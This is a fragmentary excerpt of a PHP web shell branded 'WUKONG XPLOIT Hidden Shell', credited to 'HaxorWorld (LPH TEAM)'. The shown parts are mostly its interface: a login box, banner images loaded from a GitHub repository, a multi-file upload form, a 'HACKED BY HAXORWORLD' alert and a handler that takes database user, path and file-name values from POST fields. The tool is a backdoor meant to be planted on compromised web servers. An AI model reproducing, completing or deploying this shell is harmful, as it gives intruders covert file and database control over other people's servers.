...
$GLOBALS['DB_NAME'] = $GLOBALS['WUKONG XPLOIT'];
...
<center><img style="border-radius:100px;"width="500" height="250" alt="WUKONG XPLOIT" draggable="false" src="https://github.com/wukongkay403/Shell/blob/main/wukong-wallpaper.jpg'>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>WUKONG XPLOIT</b></font></th></tr>
...
echo '<html>';
echo "<title>WUKONG XPLOIT Hidden Shell</title>";
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ WUKONG XPLOIT ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="lph team 2023" draggable="false" src="https://github.com/wukongkay403/Shell/blob/main/wukong-animasi.gif" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://github.com/wukongkay403/Shell/blob/main/wukong-icon.png';
	$s['alfamini']='https://github.com/wukongkay403/Shell/blob/main/wukong-icon.png';
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://github.com/wukongkay403/Shell/blob/main/wukong-wallpaper.jpg'>
<font color='#FFFFFF'>Shell ReCoded By HaxorWorld (LPH TEAM)</font><br>
<font color='#00A220'>Contact : WUKONG XPLOI@admin.com</font><br>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ WUKONG XPLOIT-Group &copy;-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY HAXORWORLD\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>WUKONG XPLOI@admin.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/alivosreal'>@alivosreal</a></span></div></td>
</tr>
</table>
</div>
...
if(isset($_POST['alfa6'])){
$s0levisible="Powered By WUKONG XPLOIT";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://github.com/wukongkay403/Shell/blob/main/wukong-wallpaper.jpg'>
